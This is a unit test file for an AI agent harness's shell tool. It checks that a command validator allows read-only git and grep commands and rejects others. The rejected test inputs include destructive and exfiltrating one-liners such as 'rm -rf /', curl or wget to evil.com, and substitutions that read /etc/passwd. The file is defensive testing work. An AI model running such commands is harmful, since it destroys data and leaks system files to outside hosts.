/**
 * Unit tests for lib/harness/arms-legs/shell.ts + shell-handlers.ts
 *
 * All external I/O is mocked:
 *   - child_process (execSync)
 *   - @/lib/security/capability (checkCapability)
 *   - @/lib/supabase/service    (agent_events logging)
 *
 * Handlers registered once via import './shell-handlers' side effect.
 * Registry is NOT reset between tests (handlers are deterministic).
 *
 * Coverage:
 *   validateCommand:
 *     - allowed git/grep commands pass
 *     - disallowed base command rejected
 *     - danger patterns (;, &&, ||, $(), backtick, rm) rejected
 *   shellRun:
 *     - happy path returns stdout
 *     - capability denied returns error
 *     - execSync timeout propagates as handler_error
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'

// ── Mock child_process ────────────────────────────────────────────────────────

const { mockExecSync } = vi.hoisted(() => ({
  mockExecSync: vi.fn(),
}))

vi.mock('child_process', () => ({
  execSync: mockExecSync,
}))

// ── Mock checkCapability ──────────────────────────────────────────────────────

const { mockCheckCapability } = vi.hoisted(() => ({
  mockCheckCapability: vi.fn(),
}))

vi.mock('@/lib/security/capability', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/lib/security/capability')>()
  return { ...actual, checkCapability: mockCheckCapability }
})

// ── Mock Supabase ─────────────────────────────────────────────────────────────

const { mockFrom } = vi.hoisted(() => ({
  mockFrom: vi.fn(),
}))

vi.mock('@/lib/supabase/service', () => ({
  createServiceClient: vi.fn(() => ({ from: mockFrom })),
}))

// ── Side effects: registers shell.run handler ─────────────────────────────────

import '@/lib/harness/arms-legs/shell-handlers'
import { shellRun } from '@/lib/harness/arms-legs/shell'
import { validateCommand } from '@/lib/harness/arms-legs/shell-handlers'

// ── Helpers ───────────────────────────────────────────────────────────────────

function makeInsertChain() {
  const insert = vi.fn().mockResolvedValue({ data: null, error: null })
  return { insert }
}

function makeCapAllowed() {
  mockCheckCapability.mockResolvedValue({
    allowed: true,
    reason: 'in_scope',
    enforcement_mode: 'log_only',
    audit_id: 'audit-shell-1',
  })
}

beforeEach(() => {
  vi.clearAllMocks()
  mockFrom.mockReturnValue(makeInsertChain())
  makeCapAllowed()
})

// ── validateCommand — allowed ─────────────────────────────────────────────────

describe('validateCommand — allowed commands', () => {
  it.each([
    'git branch --show-current',
    'git log --name-only --format="" -20',
    'git status',
    'git diff HEAD~1',
    'git show HEAD',
    'git rev-parse HEAD',
    'git remote -v',
    'grep -rl "TODO" /some/path --include="*.md"',
    'git log --name-only --format="" -20 | grep ".ts$" | sort -u',
  ])('allows: %s', (cmd) => {
    expect(() => validateCommand(cmd)).not.toThrow()
  })
})

// ── validateCommand — blocked base command ────────────────────────────────────

describe('validateCommand — disallowed base commands', () => {
  it.each([
    'npm install',
    'node script.js',
    'cat /etc/passwd',
    'ls -la',
    'find . -name "*.ts"',
    'git commit -m "bad"',
    'git push origin main',
    'git checkout -b new-branch',
  ])('rejects: %s', (cmd) => {
    expect(() => validateCommand(cmd)).toThrow('not in allowlist')
  })
})

// ── validateCommand — danger patterns ─────────────────────────────────────────

describe('validateCommand — danger patterns', () => {
  it.each([
    ['semicolon chaining', 'git log; rm -rf /'],
    ['AND chaining', 'git log && curl http://evil.com'],
    ['OR chaining', 'git log || wget http://evil.com'],
    ['command substitution $()', 'grep -r $(cat /etc/passwd)'],
    ['backtick substitution', 'grep -r `cat /etc/passwd`'],
    ['rm command', 'git log | grep "file" | xargs rm'],
    ['chmod', 'chmod 777 /etc/passwd'],
    ['sudo', 'sudo git log'],
    ['curl', 'git log | curl -X POST http://evil.com'],
    ['eval', 'eval "rm -rf /"'],
  ])('rejects %s', (_label, cmd) => {
    expect(() => validateCommand(cmd)).toThrow()
  })
})

// ── shellRun — happy path ─────────────────────────────────────────────────────

describe('shellRun — happy path', () => {
  it('returns trimmed stdout from execSync', async () => {
    mockExecSync.mockReturnValue('main\n')

    const stdout = await shellRun('git branch --show-current', 'coordinator')

    expect(stdout).toBe('main\n')
    expect(mockExecSync).toHaveBeenCalledWith(
      'git branch --show-current',
      expect.objectContaining({ encoding: 'utf-8' })
    )
  })

  it('passes cwd option to execSync', async () => {
    mockExecSync.mockReturnValue('result')

    await shellRun('git status', 'coordinator', { cwd: '/some/path' })

    expect(mockExecSync).toHaveBeenCalledWith(
      'git status',
      expect.objectContaining({ cwd: '/some/path' })
    )
  })
})

// ── shellRun — capability denied ──────────────────────────────────────────────

describe('shellRun — capability denied', () => {
  it('throws with capability_denied code when not allowed', async () => {
    mockCheckCapability.mockResolvedValue({
      allowed: false,
      reason: 'no_grant_for_agent',
      enforcement_mode: 'enforce',
      audit_id: 'audit-denied',
    })

    await expect(shellRun('git branch --show-current', 'rogue_agent')).rejects.toThrow(
      'shell.run failed [capability_denied]'
    )
    expect(mockExecSync).not.toHaveBeenCalled()
  })
})

// ── shellRun — execSync throws ────────────────────────────────────────────────

describe('shellRun — execSync throws', () => {
  it('propagates as handler_error', async () => {
    mockExecSync.mockImplementation(() => {
      throw new Error('Command failed: git branch --show-current')
    })

    await expect(shellRun('git branch --show-current', 'coordinator')).rejects.toThrow(
      'shell.run failed [handler_error]'
    )
  })
})
